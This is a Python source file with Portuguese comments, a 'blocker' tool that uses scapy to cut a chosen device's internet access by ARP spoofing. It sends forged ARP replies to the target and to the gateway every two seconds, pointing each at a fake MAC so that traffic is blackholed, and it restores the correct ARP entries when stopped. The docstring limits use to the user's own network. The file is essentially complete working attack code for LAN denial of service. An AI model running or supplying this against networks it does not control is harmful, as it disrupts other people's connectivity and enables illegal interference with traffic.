"""
blocker.py — corta o acesso de um dispositivo à internet na SUA rede.

Técnica: ARP spoofing direcionado. Enviamos continuamente respostas ARP
falsas dizendo ao aparelho-alvo que o roteador (gateway) está num MAC que
não existe, de modo que o tráfego dele não chega a lugar nenhum. Ao parar,
restauramos a tabela ARP correta e o aparelho volta ao normal.

⚠️  Use somente em redes que você administra. Interferir no tráfego de
    redes de terceiros é ilegal na maioria dos países.

Observações:
 - O bloqueio só vale enquanto o programa está rodando.
 - É "reversível": parar o bloqueio devolve o acesso.
 - Para bloqueio permanente, o ideal é filtrar o MAC no roteador (veja o README).
"""

import threading
import time

from scapy.all import ARP, Ether, srp, send, getmacbyip, conf, get_if_addr


def _get_gateway_ip():
    """Descobre o IP do gateway (roteador) a partir da tabela de rotas."""
    try:
        # conf.route.route("0.0.0.0") -> (interface, ip_saida, gateway)
        gw = conf.route.route("0.0.0.0")[2]
        if gw and gw != "0.0.0.0":
            return gw
    except Exception:
        pass
    # fallback comum em redes domésticas: .1 da própria sub-rede
    local = get_if_addr(conf.iface)
    return ".".join(local.split(".")[:3]) + ".1"


class Blocker:
    """Gerencia bloqueios ativos, um por MAC-alvo."""

    def __init__(self):
        self._threads = {}   # mac -> Thread
        self._stop = {}      # mac -> Event
        self.gateway_ip = _get_gateway_ip()
        self.gateway_mac = getmacbyip(self.gateway_ip)

    def refresh_gateway(self):
        """Reobtém IP e MAC do roteador (útil se a rede subiu depois do app).

        Devolve o MAC do gateway, ou None se não deu para resolver — nesse caso
        o bloqueio via ARP não tem como cortar o caminho de volta com segurança.
        """
        self.gateway_ip = _get_gateway_ip()
        if not self.gateway_mac:
            try:
                self.gateway_mac = getmacbyip(self.gateway_ip)
            except Exception:
                self.gateway_mac = None
        return self.gateway_mac

    def is_blocking(self, mac):
        return mac in self._threads and self._threads[mac].is_alive()

    def active(self):
        return [m for m in self._threads if self.is_blocking(m)]

    def _resolve(self, target_ip):
        return getmacbyip(target_ip)

    def _spoof_loop(self, target_ip, target_mac, stop_event):
        """Envia ARP falso a cada 2s enquanto o bloqueio estiver ligado."""
        # Diz ao alvo: "o gateway sou eu" com um MAC inexistente -> buraco negro.
        fake_mac = "de:ad:be:ef:00:01"
        while not stop_event.is_set():
            # para o alvo: gateway_ip está em fake_mac
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
                     psrc=self.gateway_ip, hwsrc=fake_mac),
                 verbose=False)
            # para o gateway: alvo está em fake_mac (corta o caminho de volta)
            if self.gateway_mac:
                send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                         psrc=target_ip, hwsrc=fake_mac),
                     verbose=False)
            stop_event.wait(2)
        self._restore(target_ip, target_mac)

    def _restore(self, target_ip, target_mac):
        """Reenvia ARP correto algumas vezes para o alvo reconectar rápido."""
        if not self.gateway_mac:
            return
        for _ in range(5):
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
                     psrc=self.gateway_ip, hwsrc=self.gateway_mac),
                 verbose=False)
            send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                     psrc=target_ip, hwsrc=target_mac),
                 verbose=False)
            time.sleep(0.3)

    def block(self, target_ip, mac):
        if self.is_blocking(mac):
            return
        target_mac = self._resolve(target_ip)
        if not target_mac:
            raise RuntimeError(f"Não consegui resolver o MAC de {target_ip}")
        stop_event = threading.Event()
        t = threading.Thread(
            target=self._spoof_loop,
            args=(target_ip, target_mac, stop_event),
            daemon=True,
        )
        self._stop[mac] = stop_event
        self._threads[mac] = t
        t.start()

    def unblock(self, mac):
        if mac in self._stop:
            self._stop[mac].set()
        t = self._threads.get(mac)
        if t:
            t.join(timeout=3)
        self._threads.pop(mac, None)
        self._stop.pop(mac, None)

    def unblock_all(self):
        for mac in list(self._threads):
            self.unblock(mac)
